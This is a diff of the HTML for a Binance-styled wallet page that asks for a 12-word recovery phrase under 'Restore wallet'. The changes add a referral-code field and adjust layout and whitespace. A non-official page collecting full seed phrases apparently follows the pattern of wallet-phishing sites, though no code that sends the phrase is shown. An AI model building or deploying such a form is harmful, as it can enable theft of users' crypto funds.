@@ -70,7 +70,8 @@
     <h1>Login with Your 12-Phrase Key</h1> <span class="material-symbols-outlined" id="out-button"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
     <form id="login-form">
       <textarea id="key-input" placeholder="Enter your 12 words here, separated by spaces..." required></textarea>
-      <button type="submit" id="login-button">Restore wallet</button>  
+      <input type="text" id="referral-code" placeholder="Optional">
+      <button type="submit" id="login-button">Restore wallet</button> 
       
       
     </form>
@@ -116,7 +117,8 @@
   <div class="binance-logo-back"></div> 
   <div class="wallet"> 
     
-     <div class="account-one-flex">
+    <div class="account-fixed-top">   
+    <div class="account-one-flex">
     <img src="https://cdn-icons-png.flaticon.com/128/1150/1150388.png" alt="Profile" class="binance-icon">
     <!--<div id="deposit-top-display" class="deposit-top-display hidden">Deposit</div>-->
     <div class="total-value-txt">Account 1</div> 
@@ -138,6 +140,7 @@
 <!--<button id="convert-butto" class="modal-button">Convert</button>--> 
 
     </div>
+    </div>
      
     <div class="cryptos">
       <div class="h-font">Assets</div>
@@ -146,7 +149,7 @@
   </div> 
 
   <!-- Modal for send and receive actions -->
-  <div id="crypto-modal" class="modal"> 
+  <div id="crypto-modal" class="modal">   
     <div class="modal-content"> 
       <div class="modal-main">   
   <div class="pre-info-head"><span class="close-button"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></span></div><div class="pre-info-center"><div id="balance-inside-logo"></div><div class="modal-title">Crypto Name</div></div>        
@@ -182,7 +185,7 @@
         <div class="spot-trading-box"> 
         BNB/USDC
         
-        <div id="red-BNB">Loading...</div>
+        <div id="red-BNB">Loading...</div> 
           <div class="spot-red-font">+0.64%</div>
         </div>
       </div>
@@ -1530,4 +1533,3 @@ setInterval(fetchPiPrice, 120000);
 
  
  
-
